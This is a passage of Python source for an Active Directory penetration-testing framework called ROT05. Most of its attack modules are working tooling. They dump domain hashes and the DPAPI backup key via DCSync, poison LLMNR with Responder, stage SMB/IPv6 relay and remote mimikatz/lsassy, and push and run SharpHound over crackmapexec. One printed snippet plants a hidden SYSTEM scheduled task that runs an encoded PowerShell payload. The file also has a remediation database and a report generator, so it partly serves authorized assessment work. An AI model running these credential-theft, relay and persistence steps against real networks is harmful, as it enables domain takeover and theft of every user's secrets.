  $a = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoP -W Hidden -Enc <b64>'
  $t = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5)
  Register-ScheduledTask -TaskName 'SystemHealth' -Action $a -Trigger $t -User 'SYSTEM'

{Y}Force GPO update:{RST}
  crackmapexec smb {config.ip} -u {config.username} -p '{config.password}' -x 'gpupdate /force'
""")

# ──────────────────────────────────────────────────────────────────────────────
# MODULE: CREDENTIAL ACCESS
# ──────────────────────────────────────────────────────────────────────────────

class CredentialAccess:
    @staticmethod
    def secretsdump(target_user: str = ""):
        title("Secretsdump / DC Sync")
        if not config.has_creds():
            err("Credentials required")
            return
        script = shutil.which("impacket-secretsdump") or shutil.which("secretsdump.py")
        if not script:
            warn("secretsdump not found — skipping.")
            return
        out_dir = ensure_dir("secrets")
        cmd     = [script, f"{config.domain}/{config.username}:{config.password}@{config.ip}"]
        cmd    += (["-just-dc-user", target_user] if target_user else ["-just-dc-ntlm"])
        stdout  = run_s(cmd)
        fname   = f"hashes_{target_user or 'all'}.txt"
        (out_dir / fname).write_text(stdout)
        for line in stdout.splitlines():
            if "krbtgt" in line.lower():
                success(f"KRBTGT: {line}")
        info("Crack NTLM: hashcat -m 1000 hashes.txt rockyou.txt")

    @staticmethod
    def dpapi_backup():
        title("DPAPI Backup Key")
        if not config.has_creds():
            err("Credentials required")
            return
        script = shutil.which("impacket-secretsdump") or shutil.which("secretsdump.py")
        if not script:
            return
        out_dir = ensure_dir("dpapi")
        stdout  = run_s([script,
                         f"{config.domain}/{config.username}:{config.password}@{config.ip}",
                         "-backup-key"])
        (out_dir / "backup_key.txt").write_text(stdout)
        info("Decrypt blobs: dpapi.py masterkey -backupkey <KEY> /path/to/masterkey")

    @staticmethod
    def mimikatz_remote():
        title("Remote Mimikatz")
        if not config.has_creds():
            err("Credentials required")
            return
        print(f"""
{Y}Via CME module:{RST}
  crackmapexec smb {config.ip} -u {config.username} -p '{config.password}' -M mimikatz

{Y}Via lsassy:{RST}
  crackmapexec smb {config.ip} -u {config.username} -p '{config.password}' -M lsassy
""")

# ──────────────────────────────────────────────────────────────────────────────
# MODULE: RELAY ATTACKS
# ──────────────────────────────────────────────────────────────────────────────

class RelayAttacks:
    @staticmethod
    def responder(duration: int = 60):
        title(f"Responder — LLMNR Poisoning ({duration}s)")
        if not require_tool("responder"):
            return
        out_dir = ensure_dir("responder")
        ts      = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        out_file = out_dir / f"hashes_{ts}.txt"

        def _run():
            stdout, _ = run(["sudo", "timeout", str(duration),
                             "responder", "-I", config.interface, "-rdwv"],
                            timeout=duration + 15)
            out_file.write_text(stdout)

        t = threading.Thread(target=_run, daemon=True)
        t.start()
        info(f"Responder running in background on {config.interface} ({duration}s)")
        info(f"Hashes → {out_file}")
        info("Crack NTLMv2: hashcat -m 5600 <file> rockyou.txt")

    @staticmethod
    def smb_relay(targets_file: str = "targets.txt"):
        title("SMB Relay")
        if not Path(targets_file).exists():
            err(f"Targets file not found: {targets_file}")
            return
        print(f"""
{Y}Terminal 1 – Responder (SMB/HTTP off):{RST}
  sudo sed -i 's/SMB = On/SMB = Off/; s/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf
  sudo responder -I {config.interface} -rdwv

{Y}Terminal 2 – ntlmrelayx:{RST}
  sudo impacket-ntlmrelayx -tf {targets_file} -smb2support -i

{Y}IPv6 / mitm6:{RST}
  sudo mitm6 -d {config.domain}
  sudo impacket-ntlmrelayx -6 -t ldaps://{config.ip} -wh fakewpad.{config.domain}
""")

# ──────────────────────────────────────────────────────────────────────────────
# MODULE: BLOODHOUND
# ──────────────────────────────────────────────────────────────────────────────

class BloodHound:
    @staticmethod
    def collect(sharphound: str = "SharpHound.exe"):
        title("BloodHound — Data Collection")
        out_dir = ensure_dir("bloodhound")
        if Path(sharphound).exists() and config.has_creds():
            run(["crackmapexec", "smb", config.ip,
                 "-u", config.username, "-p", config.password,
                 "--put-file", sharphound, "Windows/Temp/SharpHound.exe"])
            run(["crackmapexec", "winrm", config.ip,
                 "-u", config.username, "-p", config.password,
                 "-X", "Windows\\Temp\\SharpHound.exe -c All"])
            run(["crackmapexec", "smb", config.ip,
                 "-u", config.username, "-p", config.password,
                 "--get-file", "Windows\\Temp\\*.zip", str(out_dir) + "/"])
            success(f"BloodHound data → {out_dir}")
        else:
            print(f"""
{Y}Manual collection:{RST}
  crackmapexec smb {config.ip} -u {config.username} -p '{config.password}' --put-file SharpHound.exe Windows/Temp/
  crackmapexec winrm {config.ip} -u {config.username} -p '{config.password}' -X 'Windows\\Temp\\SharpHound.exe -c All'
  crackmapexec smb {config.ip} -u {config.username} -p '{config.password}' --get-file Windows\\Temp\\*.zip {out_dir}/
  neo4j console && bloodhound --no-sandbox
""")

# ──────────────────────────────────────────────────────────────────────────────
# MODULE: CVE SCANNER  — FIX: renamed loop var 'info' → 'vuln'
# ──────────────────────────────────────────────────────────────────────────────

class CVEScanner:
    VULNS = {
        "CVE-2020-1472": {"name": "Zerologon",      "port": 445,  "check": ["nmap", "--script", "smb-vuln-cve-2020-1472", "-p", "445", "{ip}"]},
        "CVE-2021-26855": {"name": "ProxyLogon",     "port": 443,  "check": ["curl", "-k", "-s", "-I", "https://{ip}/owa/", "--max-time", "5"]},
        "CVE-2021-34473": {"name": "ProxyShell",     "port": 443,  "check": ["curl", "-k", "-s", "-X", "OPTIONS", "https://{ip}/autodiscover/", "--max-time", "5"]},
        "CVE-2019-1040":  {"name": "PrivExchange",   "port": 443,  "check": ["nmap", "-p", "443", "--script", "http-ntlm-info", "{ip}"]},
        "MS17-010":       {"name": "EternalBlue",    "port": 445,  "check": ["nmap", "--script", "smb-vuln-ms17-010", "-p", "445", "{ip}"]},
        "CVE-2020-0618":  {"name": "SQL RCE",        "port": 1433, "check": ["nmap", "-p", "1433", "--script", "ms-sql-info", "{ip}"]},
    }

    @staticmethod
    def scan():
        title("CVE Scanner")
        out_dir = ensure_dir("cves")
        results = []

        for cve_id, vuln in CVEScanner.VULNS.items():      # FIX: was 'info' — now 'vuln'
            if not is_port_open(config.ip, vuln["port"]):
                debug(f"Port {vuln['port']} closed — skip {cve_id}")
                continue
            step(f"Checking {cve_id} ({vuln['name']}) …")
            cmd    = [tok.replace("{ip}", config.ip) for tok in vuln["check"]]
            stdout = run_s(cmd, timeout=30)
            if stdout and len(stdout) > 10:
                warn(f"  {cve_id} — POSSIBLE VULNERABILITY")
                results.append({"cve": cve_id, "name": vuln["name"], "details": stdout[:200]})
            else:
                info(f"  {cve_id} — not detected")

        (out_dir / "scan_results.json").write_text(json.dumps(results, indent=2))
        title("Vulnerability Summary")
        if results:
            for r in results:
                print(f"{R}[!]{RST} {r['cve']} — {r['name']}")
        else:
            success("No known vulnerabilities detected")
        return results

# ──────────────────────────────────────────────────────────────────────────────
# REMEDIATION DATABASE
# ──────────────────────────────────────────────────────────────────────────────

_SEVER_ORDER = {"Critical": 0, "High": 1, "Medium": 2, "Low": 3, "Info": 4}

REMEDIATION_DB: Dict[str, Dict] = {
    "kerberoast": {
        "title": "Kerberoastable Service Accounts",
        "severity": "High",
        "description": (
            "Service accounts with SPNs allow any authenticated user to request TGS tickets "
            "and crack them offline with hashcat (mode 13100)."
        ),
        "remediation": [
            "Replace service accounts with Group Managed Service Accounts (gMSA) — passwords auto-rotate with 128-char entropy.",
            "Where gMSA is not possible, enforce passwords >25 random characters.",
            "Audit SPNs: Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName",
            "Enable AES-256 encryption and remove RC4 support (msDS-SupportedEncryptionTypes = 24).",
        ],
        "mitre": "T1558.003",
        "references": ["https://attack.mitre.org/techniques/T1558/003/"],
    },
    "asreproast": {
        "title": "AS-REP Roastable Accounts",
        "severity": "High",
        "description": (
            "Accounts with 'Do not require Kerberos preauthentication' (DONT_REQ_PREAUTH) "
            "allow unauthenticated AS-REP hash extraction and offline cracking."
        ),
        "remediation": [
            "Enable Kerberos preauthentication on all accounts.",
            "Audit: Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth",
            "If preauthentication must remain disabled, enforce passwords >25 random characters.",
        ],
        "mitre": "T1558.004",
        "references": ["https://attack.mitre.org/techniques/T1558/004/"],
    },
    "cpassword": {
        "title": "GPP cPassword in SYSVOL (MS14-025)",
        "severity": "Critical",
        "description": (
            "Group Policy Preferences can store credentials (cPassword) encrypted with a "
            "publicly disclosed AES key. Any domain user can decrypt these trivially."
        ),
        "remediation": [
            "Apply MS14-025 (KB2962486) on all Group Policy management systems.",
            "Delete all Groups.xml, Services.xml, ScheduledTasks.xml, DataSources.xml containing cpassword from SYSVOL.",
            "Reset passwords for every account found in GPP files.",
            "Deploy LAPS to manage local admin passwords going forward.",
        ],
        "mitre": "T1552.006",
        "references": [
            "https://support.microsoft.com/kb/2962486",
            "https://attack.mitre.org/techniques/T1552/006/",
        ],
    },
    "smb_signing_disabled": {
        "title": "SMB Signing Not Required",
        "severity": "Medium",
        "description": (
            "SMB signing is disabled or not required, enabling NTLM relay attacks "
            "that can escalate any captured NTLMv2 hash to full host compromise."
        ),
        "remediation": [
            "Enable and require SMB signing via GPO: Computer Config → Windows Settings → Security Settings → Local Policies → Security Options → 'Microsoft network server: Digitally sign communications (always)' = Enabled.",
            "Also enable 'Microsoft network client: Digitally sign communications (always)'.",
            "Test compatibility with legacy devices before broad enforcement.",
        ],
        "mitre": "T1557.001",
        "references": ["https://attack.mitre.org/techniques/T1557/001/"],
    },
    "anon_ldap": {
        "title": "Anonymous LDAP Access Permitted",
        "severity": "Medium",
        "description": (
            "The domain controller accepts unauthenticated LDAP queries, allowing "
            "anyone on the network to enumerate users, groups, and OUs without credentials."
        ),
        "remediation": [
            "Set dsHeuristics bit 7 to 0 to disable anonymous LDAP.",
            "Apply KB4520412 (2020 LDAP channel binding and signing requirements).",
            "Monitor anonymous LDAP queries via Event ID 2889 in the Directory Service log.",
        ],
        "mitre": "T1087.002",
        "references": ["https://support.microsoft.com/topic/2020-ldap-channel-binding-and-ldap-signing-kb4520412"],
    },
    "adcs_vulnerable": {
        "title": "Vulnerable AD CS Certificate Templates",
        "severity": "Critical",
        "description": (
            "Certificate templates are misconfigured (ESC1–ESC8), enabling privilege "
            "escalation to Domain Admin via certificate abuse."
        ),
        "remediation": [
            "Remove 'Enrollee Supplies Subject' from unprivileged templates (ESC1 fix).",
            "Disable the EDITF_ATTRIBUTESUBJECTALTNAME2 CA flag (ESC6 fix).",
            "Require CA Manager Approval for any template that issues machine or DC certificates.",
            "Apply Microsoft's May 2022 AD CS hardening patches.",
            "Re-audit with: certipy find -u user@domain -p pass -dc-ip <IP> -vulnerable",
        ],
        "mitre": "T1649",
        "references": ["https://posts.specterops.io/certified-pre-owned-d95910965cd2"],
    },
    "secrets_dumped": {
        "title": "NTLM Hashes / Domain Secrets Extracted",
        "severity": "Critical",
        "description": (
            "Domain credential hashes (including KRBTGT) were successfully extracted via "
            "DCSync. An attacker with these hashes can forge Golden Tickets valid for 10 years."
        ),
        "remediation": [
            "Rotate the krbtgt password TWICE with a 10-hour gap to invalidate all Kerberos tickets.",
            "Reset every account whose hash was extracted.",
            "Investigate and remove the replication (DCSync) rights that were abused.",
            "Enable Protected Users Security Group for all tier-0 accounts.",
            "Deploy Microsoft Credential Guard on privileged workstations.",
            "Implement a tiered administration model to contain lateral movement.",
        ],
        "mitre": "T1003.006",
        "references": ["https://attack.mitre.org/techniques/T1003/006/"],
    },
    "dpapi_backup": {
        "title": "DPAPI Domain Backup Key Extracted",
        "severity": "Critical",
        "description": (
            "The domain-wide DPAPI backup key was extracted. This key decrypts every "
            "DPAPI-protected secret (saved passwords, certificate private keys, Wi-Fi PSKs) "
            "on every machine in the domain, past and present."
        ),
        "remediation": [
            "Treat the backup key as permanently compromised; initiate incident response.",
            "Contact Microsoft support to rotate the backup key (no self-service rotation exists).",
            "Audit and rotate all DPAPI-protected secrets across the domain.",
            "Rotate all service account passwords, Wi-Fi PSKs, and stored browser credentials.",
        ],
        "mitre": "T1555.004",
        "references": ["https://attack.mitre.org/techniques/T1555/004/"],
    },
    "CVE-2020-1472": {
        "title": "Zerologon (CVE-2020-1472)",
        "severity": "Critical",
        "description": (
            "A cryptographic flaw in Netlogon allows an unauthenticated attacker to "
            "impersonate any domain computer and gain Domain Admin access in seconds."
        ),
        "remediation": [
            "Apply Microsoft August 2020 cumulative update immediately.",
            "Enforce Netlogon secure channel: FullSecureChannelProtection=1 in HKLM\\SYSTEM\\CurrentControlSet\\Services\\Netlogon\\Parameters.",
            "Monitor Event IDs 5827–5831 in the System log for exploitation attempts.",
        ],
        "mitre": "T1210",
        "references": ["https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-1472"],
    },
    "CVE-2021-26855": {
        "title": "ProxyLogon (CVE-2021-26855)",
        "severity": "Critical",
        "description": (
            "An SSRF vulnerability in Exchange Server allows pre-authenticated RCE "
            "as SYSTEM via crafted HTTP requests."
        ),
        "remediation": [
            "Apply Exchange Server March 2021 Security Update immediately.",
            "If patching is delayed, run Microsoft's ExchangeMitigations.ps1 IIS URL rewrite rules.",
            "Restrict /autodiscover/, /ews/, and /owa/ to known IP ranges at the WAF.",
        ],
        "mitre": "T1190",
        "references": ["https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855"],
    },
    "CVE-2021-34473": {
        "title": "ProxyShell (CVE-2021-34473)",
        "severity": "Critical",
        "description": (
            "A URL confusion + ACL bypass + deserialization chain in Exchange allows "
            "pre-authenticated RCE as SYSTEM."
        ),
        "remediation": [
            "Apply Exchange July 2021 Cumulative Update + Security Update.",
            "Block autodiscover paths at the WAF/reverse proxy.",
            "Enable AMSI integration for Exchange to detect web shell uploads.",
        ],
        "mitre": "T1190",
        "references": ["https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34473"],
    },
    "CVE-2019-1040": {
        "title": "PrivExchange NTLM Relay (CVE-2019-1040)",
        "severity": "High",
        "description": (
            "Exchange's push-notification mechanism can relay its high-privilege credentials "
            "to LDAP, granting DCSync rights to an attacker."
        ),
        "remediation": [
            "Apply KB4490060 / KB4487563.",
            "Enable LDAP signing and channel binding on all domain controllers.",
            "Remove Exchange's over-privileged AD rights using the PrivExchange remediation script.",
            "Enable Extended Protection for Authentication (EPA) on Exchange.",
        ],
        "mitre": "T1557",
        "references": ["https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-1040"],
    },
    "MS17-010": {
        "title": "EternalBlue (MS17-010)",
        "severity": "Critical",
        "description": (
            "SMBv1 remote code execution used by WannaCry/NotPetya ransomware. "
            "Allows unauthenticated RCE as SYSTEM on unpatched Windows machines."
        ),
        "remediation": [
            "Apply MS17-010 security update immediately.",
            "Disable SMBv1: Set-SmbServerConfiguration -EnableSMB1Protocol $false",
            "Block port 445 from all internet-facing interfaces.",
            "Block workstation-to-workstation SMB with host-based firewall rules.",
        ],
        "mitre": "T1210",
        "references": ["https://support.microsoft.com/topic/ms17-010-security-update-march-2017"],
    },
    "CVE-2020-0618": {
        "title": "SQL Server Reporting Services RCE (CVE-2020-0618)",
        "severity": "High",
        "description": (
            "A deserialization vulnerability in SQL Server Reporting Services (SSRS) "
            "allows an authenticated attacker to execute arbitrary code as the service account."
        ),
        "remediation": [
            "Apply February 2020 SQL Server security update (KB4532095 / KB4532097).",
            "Restrict SSRS to internal networks only — never expose to the internet.",
            "Disable SSRS if it is not actively used.",
        ],
        "mitre": "T1210",
        "references": ["https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0618"],
    },
}

# ──────────────────────────────────────────────────────────────────────────────
# REPORT HELPERS
# ──────────────────────────────────────────────────────────────────────────────

def _collect_findings() -> List[Dict]:
    """Scan output files and return a sorted list of structured finding dicts."""
    findings: List[Dict] = []

    def _add(key: str, evidence: str = "") -> None:
        rec = REMEDIATION_DB.get(key)
        if rec:
            findings.append({
                "key":         key,
                "title":       rec["title"],
                "severity":    rec["severity"],
                "description": rec["description"],
                "remediation": rec["remediation"],
                "mitre":       rec.get("mitre", ""),
                "references":  rec.get("references", []),
                "evidence":    evidence,
            })

    p = OUTPUT_DIR

    # Kerberoast
    f = p / "kerberoast" / "hashes.txt"
    if f.exists() and f.stat().st_size > 0:
        _add("kerberoast")

    # AS-REP
    f = p / "asrep" / "hashes.txt"
    if f.exists() and f.stat().st_size > 0:
        _add("asreproast")

    # GPP cPassword
    f = p / "gpo" / "cpassword_results.txt"
    if f.exists() and "cpassword" in f.read_text().lower():
        _add("cpassword")

    # SMB signing
    f = p / "smb" / "smb-signing.txt"
    if f.exists() and "message_signing: disabled" in f.read_text().lower():
        _add("smb_signing_disabled")

    # Anonymous LDAP (non-trivial response → access allowed)
    f = p / "ldap" / "anon-base-dump.txt"
    if f.exists() and f.stat().st_size > 200:
        _add("anon_ldap")

    # AD CS vulnerable templates
    f = p / "adcs" / "ca_discovery.txt"
    if f.exists() and "VULNERABLE" in f.read_text():
        _add("adcs_vulnerable")

    # Secrets / DCSync
    d = p / "secrets"
    if d.exists() and any(d.iterdir()):
        _add("secrets_dumped")

    # DPAPI backup key
    d = p / "dpapi"
    if d.exists() and any(d.iterdir()):
        _add("dpapi_backup")

    # CVE scanner results
    f = p / "cves" / "scan_results.json"
    if f.exists():
        try:
            for r in json.loads(f.read_text()):
                _add(r["cve"], r.get("details", "")[:200])
        except Exception:
            pass

    findings.sort(key=lambda x: _SEVER_ORDER.get(x["severity"], 99))
    return findings


_SEVER_CSS = {
    "Critical": "#e53e3e",
    "High":     "#dd6b20",
    "Medium":   "#d69e2e",
    "Low":      "#3182ce",
    "Info":     "#718096",
}


def generate_html_report(findings: List[Dict]) -> Path:
    """Produce a self-contained dark-theme HTML report. Returns the output path."""
    out_path = ensure_dir() / "REPORT.html"
    now      = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    services = detect_services(config.ip) if config.ip else {}
    active   = [s for s, up in services.items() if up]

    counts = {s: sum(1 for f in findings if f["severity"] == s)
              for s in ["Critical", "High", "Medium", "Low", "Info"]}

    # Evidence integrity rows
    ev_rows = ""
    if OUTPUT_DIR.exists():
        for subdir in sorted(OUTPUT_DIR.iterdir()):
            if subdir.is_dir():
                for fp in sorted(subdir.iterdir()):
                    if fp.is_file() and not fp.name.startswith("."):
                        sha  = calculate_file_hash(fp)
                        size = fp.stat().st_size
                        ev_rows += (
                            f"<tr><td>{subdir.name}/{fp.name}</td>"
                            f"<td>{size:,}</td>"
                            f"<td class='mono'>{sha[:16]}…</td></tr>\n"
                        )

    # Finding cards
    cards = ""
    for i, f in enumerate(findings):
        color  = _SEVER_CSS.get(f["severity"], "#718096")
        rems   = "".join(f"<li>{r}</li>" for r in f["remediation"])
        refs   = "".join(f'<a href="{r}" class="ref">{r}</a>' for r in f["references"])
        mitre  = (f'<span class="mitre">MITRE&nbsp;{f["mitre"]}</span>'
                  if f["mitre"] else "")
        evid   = (f'<p class="evid"><strong>Evidence:</strong> {f["evidence"]}</p>'
                  if f.get("evidence") else "")
        cards += f"""
        <div class="card" id="f{i}">
          <div class="card-hdr" style="border-left:4px solid {color}">
            <span class="badge" style="background:{color}">{f['severity']}</span>
            <span class="card-title">{f['title']}</span>
            {mitre}
          </div>
          <div class="card-body">
            <p class="desc">{f['description']}</p>
            {evid}
            <h4>Remediation Steps</h4>
            <ol class="rlist">{rems}</ol>
            <div class="refs">{refs}</div>
          </div>
        </div>"""

    # Severity summary bars
    bars = ""
    for sev, cnt in counts.items():
        if cnt:
            color = _SEVER_CSS[sev]
            w     = min(cnt * 30, 300)
            bars += (
                f'<div class="srow">'
                f'<span class="slbl">{sev}</span>'
                f'<div class="sbar-wrap"><div class="sbar" style="width:{w}px;background:{color}"></div></div>'
                f'<span class="scnt" style="color:{color}">{cnt}</span>'
                f'</div>'
            )

    svc_html = (
        "".join(f'<span class="chip">{s}</span>' for s in active)
        or "<em>None detected</em>"
    )

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>ROT05 Report — {config.ip or 'Unknown'}</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{font-family:'Segoe UI',system-ui,sans-serif;background:#0f1117;color:#e2e8f0;line-height:1.6;padding:2rem}}
a{{color:#63b3ed}}a:hover{{text-decoration:underline}}
.page{{max-width:960px;margin:0 auto}}
.hdr{{background:linear-gradient(135deg,#1a1f2e,#2d3748);border-radius:12px;padding:2rem;margin-bottom:2rem;border:1px solid #2d3748}}
.hdr h1{{font-size:1.8rem;color:#f7fafc}}.hdr h1 span{{color:#e53e3e}}
.meta{{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:1rem;margin-top:1.5rem}}
.mc{{background:#1a202c;border-radius:8px;padding:1rem;border:1px solid #2d3748}}
.mc .lbl{{font-size:.72rem;color:#718096;text-transform:uppercase;letter-spacing:.05em}}
.mc .val{{font-size:.95rem;color:#f7fafc;margin-top:.2rem;word-break:break-all}}
.sec{{margin-bottom:2rem}}
.sec-title{{font-size:1rem;font-weight:600;color:#a0aec0;text-transform:uppercase;letter-spacing:.08em;margin-bottom:1rem;padding-bottom:.4rem;border-bottom:1px solid #2d3748}}
.box{{background:#1a202c;border-radius:8px;padding:1.5rem;border:1px solid #2d3748}}
.srow{{display:flex;align-items:center;gap:1rem;margin-bottom:.55rem}}
.slbl{{width:70px;font-size:.83rem;font-weight:600}}
.sbar-wrap{{flex:1;background:#2d3748;border-radius:4px;height:16px}}
.sbar{{height:16px;border-radius:4px;min-width:4px}}
.scnt{{width:28px;text-align:right;font-weight:700;font-size:.9rem}}
.chip{{display:inline-block;background:#2d3748;border-radius:4px;padding:.2rem .55rem;font-size:.78rem;margin:.2rem;color:#90cdf4}}
.card{{background:#1a202c;border-radius:8px;margin-bottom:1rem;border:1px solid #2d3748;overflow:hidden}}
.card-hdr{{display:flex;align-items:center;gap:.65rem;padding:.9rem 1.2rem;background:#1e2535}}
.badge{{font-size:.68rem;font-weight:700;padding:.18rem .55rem;border-radius:4px;color:#fff;white-space:nowrap}}
.card-title{{font-weight:600;font-size:.97rem;flex:1}}
.mitre{{font-size:.68rem;background:#2d3748;color:#a0aec0;padding:.18rem .45rem;border-radius:4px;white-space:nowrap}}
.card-body{{padding:1.2rem}}
.desc{{color:#a0aec0;margin-bottom:.9rem;font-size:.88rem}}
.evid{{font-size:.78rem;color:#718096;font-style:italic;margin-bottom:.9rem;background:#171923;padding:.45rem .7rem;border-radius:4px;border-left:3px solid #2d3748}}
h4{{font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;color:#718096;margin-bottom:.45rem}}
.rlist{{padding-left:1.2rem;font-size:.86rem;color:#cbd5e0}}
.rlist li{{margin-bottom:.35rem}}
.refs{{margin-top:.9rem}}
.ref{{font-size:.76rem;display:block;color:#63b3ed;margin:.12rem 0}}
.empty{{background:#1a202c;border-radius:8px;padding:2rem;text-align:center;color:#68d391;border:1px solid #2f855a}}
table{{width:100%;border-collapse:collapse;font-size:.78rem}}
th{{background:#2d3748;color:#a0aec0;text-align:left;padding:.45rem .7rem;font-weight:600;text-transform:uppercase;letter-spacing:.05em}}
td{{padding:.4rem .7rem;border-bottom:1px solid #2d3748;color:#a0aec0}}
tr:hover td{{background:#1e2535}}
.mono{{font-family:monospace;font-size:.73rem}}
.foot{{text-align:center;color:#4a5568;font-size:.75rem;margin-top:2rem;padding-top:1rem;border-top:1px solid #2d3748}}
@media print{{body{{background:#fff;color:#000}}.hdr,.card,.box{{background:#f7fafc;border-color:#e2e8f0}}.card-hdr{{background:#edf2f7}}a{{color:#2b6cb0}}}}
</style>
</head>
<body>
<div class="page">

<div class="hdr">
  <h1><span>ROT05</span> Penetration Test Report</h1>
  <div class="meta">
    <div class="mc"><div class="lbl">Target</div><div class="val">{config.ip or '—'}</div></div>
    <div class="mc"><div class="lbl">Domain</div><div class="val">{config.domain or '—'}</div></div>
    <div class="mc"><div class="lbl">Assessor</div><div class="val">{config.username or '—'}</div></div>
    <div class="mc"><div class="lbl">Generated</div><div class="val">{now}</div></div>
    <div class="mc"><div class="lbl">Total Findings</div><div class="val">{len(findings)}</div></div>
  </div>
</div>

<div class="sec">
  <div class="sec-title">Detected Services</div>
  <div class="box">{svc_html}</div>
</div>

<div class="sec">
  <div class="sec-title">Finding Summary</div>
  <div class="box">
    {bars or '<p style="color:#68d391">No findings detected.</p>'}
  </div>
</div>

<div class="sec">
  <div class="sec-title">Findings &amp; Remediation</div>
  {cards or '<div class="empty">No critical findings detected during this assessment.</div>'}
</div>

<div class="sec">
  <div class="sec-title">Evidence Integrity (SHA-256)</div>
  <div class="box" style="padding:0;overflow:auto">
    <table>
      <thead><tr><th>File</th><th>Bytes</th><th>SHA-256 (first 16 chars)</th></tr></thead>
      <tbody>{ev_rows or '<tr><td colspan="3" style="text-align:center">No output files found</td></tr>'}</tbody>
    </table>
  </div>
</div>

<div class="foot">
  Generated by ROT05 — Authorized penetration testing only. CONFIDENTIAL.
</div>

</div>
</body>
</html>"""

    out_path.write_text(html, encoding="utf-8")
    success(f"HTML report → {out_path}")
    return out_path


def generate_pdf_report(html_path: Path) -> Optional[Path]:
    """Convert the HTML report to PDF using WeasyPrint. Returns path or None."""
    try:
        from weasyprint import HTML as _WH
    except ImportError:
        warn("weasyprint not installed — PDF skipped.  pip install weasyprint")
        return None
    out_path = html_path.with_suffix(".pdf")
    try:
        _WH(filename=str(html_path)).write_pdf(str(out_path))
        success(f"PDF report  → {out_path}")
        return out_path
    except Exception as exc:
        err(f"PDF generation failed: {exc}")
        return None


# ──────────────────────────────────────────────────────────────────────────────
# REPORT  (TXT + HTML + PDF)
# ──────────────────────────────────────────────────────────────────────────────

def generate_report():
    title("Generating Reports")
    findings    = _collect_findings()
    report_file = ensure_dir() / "REPORT.txt"
    services    = detect_services(config.ip) if config.ip else {}

    # ── Plain-text report (always generated) ────────────────────────────────
    lines = [
        "ROT05 Assessment Report",
        "=" * 60,
        f"Target:    {config.ip}",
        f"Domain:    {config.domain}",
        f"Timestamp: {datetime.datetime.now()}",
        f"Findings:  {len(findings)} total",
        "=" * 60,
        "",
        "DETECTED SERVICES:",
        *[f"  • {k}" for k, v in services.items() if v],
        "",
        "FINDINGS:",
    ]
    for f in findings:
        lines.append(f"  [{f['severity']:8s}] {f['title']}")
        if f.get("mitre"):
            lines.append(f"               MITRE: {f['mitre']}")
    if not findings:
        lines.append("  No critical findings detected")

    lines += ["", "REMEDIATION SUMMARY:"]
    for f in findings:
        lines += ["", f"[{f['severity']}] {f['title']}", f['description'], ""]
        for i, r in enumerate(f["remediation"], 1):
            lines.append(f"  {i}. {r}")
        if f["references"]:
            lines.append(f"  References: {', '.join(f['references'])}")

    lines += ["", "OUTPUT FILES (SHA256):"]
    for subdir in sorted(OUTPUT_DIR.iterdir()):
        if subdir.is_dir():
            lines.append(f"\n[{subdir.name.upper()}]")
            for fp in sorted(subdir.iterdir()):
                if fp.is_file():
                    sha = calculate_file_hash(fp)
                    lines.append(f"  {fp.name:<40s}  {sha}")
    lines += ["", "=" * 60]
    report_file.write_text("\n".join(lines))
    success(f"TXT report  → {report_file}")

    # ── HTML + PDF + Dashboard ───────────────────────────────────────────────
    html_path = generate_html_report(findings)
    generate_pdf_report(html_path)
    generate_dashboard(findings)


# ──────────────────────────────────────────────────────────────────────────────
# DASHBOARD  — interactive HTML app baked with real scan data
# ──────────────────────────────────────────────────────────────────────────────

def _parse_nmap_xml(xml_path: Path) -> List[Dict]:
    """Parse an nmap XML file into a list of port dicts."""
    import xml.etree.ElementTree as ET
    ports = []
    try:
        tree = ET.parse(xml_path)
        for port_el in tree.findall(".//port"):
            state_el   = port_el.find("state")
            service_el = port_el.find("service")
            state = state_el.attrib.get("state", "unknown") if state_el is not None else "unknown"
            svc   = service_el.attrib.get("name", "") if service_el is not None else ""
            ver   = ""
            if service_el is not None:
                parts = [service_el.attrib.get(k, "") for k in ("product", "version", "extrainfo")]
                ver   = " ".join(p for p in parts if p).strip()
            ports.append({
                "p":   int(port_el.attrib.get("portid", 0)),
                "pr":  port_el.attrib.get("protocol", "tcp"),
                "st":  state,
                "svc": svc,
                "ver": ver,
                "cves": [],
            })
    except Exception:
        pass
    return ports


def _parse_nmap_txt(txt_path: Path) -> List[Dict]:
    """Fallback: parse plain nmap text output for open ports."""
    ports = []
    if not txt_path.exists():
        return ports
    for line in txt_path.read_text(errors="replace").splitlines():
        m = re.match(r"(\d+)/(tcp|udp)\s+(open|closed|filtered)\s+(\S+)?\s*(.*)", line.strip())
        if m:
            ports.append({
                "p":   int(m.group(1)),
                "pr":  m.group(2),
                "st":  m.group(3),
                "svc": (m.group(4) or "").strip(),
                "ver": (m.group(5) or "").strip(),
                "cves": [],
            })
    return ports


def _nmap_raw_text() -> str:
    """Return the first available nmap plain-text log."""
    for candidate in ("services.log", "all-ports.log"):
        p = OUTPUT_DIR / "nmap" / candidate
        if p.exists():
            return p.read_text(errors="replace")
    return "(no nmap output available)"


def _detect_cves_from_smb_output() -> List[str]:
    """Check smb-scripts output for known CVE markers."""
    cves = []
    f = OUTPUT_DIR / "nmap" / "smb-scripts.log"
    if f.exists():
        text = f.read_text(errors="replace").lower()
        if "ms17-010" in text or "eternalblue" in text:
            cves.append("MS17-010")
        if "ms08-067" in text:
            cves.append("MS08-067")
    return cves


_DASH_TPL = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>ROT05 Intel</title>
<style>
:root{
